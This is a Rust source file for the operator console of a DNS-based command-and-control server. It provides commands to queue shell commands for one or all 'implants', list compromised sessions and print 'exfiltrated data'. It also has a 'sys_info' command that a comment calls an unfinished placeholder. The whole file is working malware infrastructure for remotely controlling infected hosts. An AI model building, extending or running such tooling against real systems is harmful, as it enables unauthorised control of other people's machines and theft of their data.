use std::io::{self, Write};
use std::sync::{Arc, Mutex};

use crate::server::c2_state::C2State;

pub fn print_banner() {
    println!("\n{:=<70}", "");
    println!("            DNS C2 Server - Command & Control");
    println!("{:=<70}", "");
    println!("Server listening on 0.0.0.0:5353");
    println!("(Use port 53 for real use - requires sudo)\n");
}

pub fn print_help() {
    println!("\nCommands:");
    println!("  cmd <implant_id> <command>  - Queue shell command for implant");
    println!("  cmd_all <command>           - Queue shell command for all active implants");
    println!("  sessions                    - List active implant sessions");
    println!("  cleanup                     - Remove stale sessions");
    println!("  data <implant_id>           - Show exfiltrated data");
    println!("  help                        - Show this help");
    println!("  exit                        - Shutdown server\n");
}

/// Main server loop to reveive user input
pub fn cli_loop(c2_state: Arc<Mutex<C2State>>) {
    print_help();

    loop {
        print!("c2> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            continue;
        }

        let input = input.trim();
        let parts: Vec<&str> = input.split_whitespace().collect();

        if parts.is_empty() {
            continue;
        }

        match parts[0] {
            "cmd" => {
                if parts.len() < 3 {
                    println!("Usage: cmd <implant_id> <command>");
                    continue;
                }
                let implant_id = parts[1];
                let command = parts[2..].join(" ");

                let mut state = c2_state.lock().unwrap();
                state.add_command(implant_id, &command);
            }
            "cmd_all" => {
                if parts.len() < 2 {
                    println!("Usage: cmd_all <command>");
                    continue;
                }
                let command = parts[1..].join(" ");

                // get and pass a struct of all sessions
                let mut state = c2_state.lock().unwrap();

                state.add_global_command(&command);
            }
            "sessions" => {
                let state = c2_state.lock().unwrap();
                state.list_sessions();
            }
            "sys_info" => {
                // This is copilot slop -- just a placeholder
                let state = c2_state.lock().unwrap();
                println!("\n[System Information from Implants]");
                println!("{:-<70}", "");
                for (id, session) in &state.sessions {
                    let info = session
                        .data_chunks
                        .get(&0)
                        .cloned()
                        .unwrap_or_else(|| "No sysinfo received".to_string());
                    println!("{}:\n{}\n", id, info);
                }
                println!("{:-<70}", "");
            }
            "data" => {
                if parts.len() < 2 {
                    println!("Usage: data <implant_id>");
                    continue;
                }
                let implant_id = parts[1];
                let state = c2_state.lock().unwrap();

                if let Some(data) = state.get_exfil_data(implant_id) {
                    println!("\n[Exfiltrated Data from {}]", implant_id);
                    println!("{:-<70}", "");
                    println!("{}", data);
                    println!("{:-<70}", "");
                } else {
                    println!("No data found for implant: {}", implant_id);
                }
            }
            "cleanup" => {
                let mut state = c2_state.lock().unwrap();
                let removed = state.cleanup_stale_sessions();
                println!("Cleaned up {} stale session(s)", removed);
            }
            "help" => {
                print_help();
            }
            "exit" => {
                println!("Shutting down...");
                std::process::exit(0);
            }
            _ => {
                println!("Unknown command: {}. Type 'help' for commands.", parts[0]);
            }
        }
    }
}
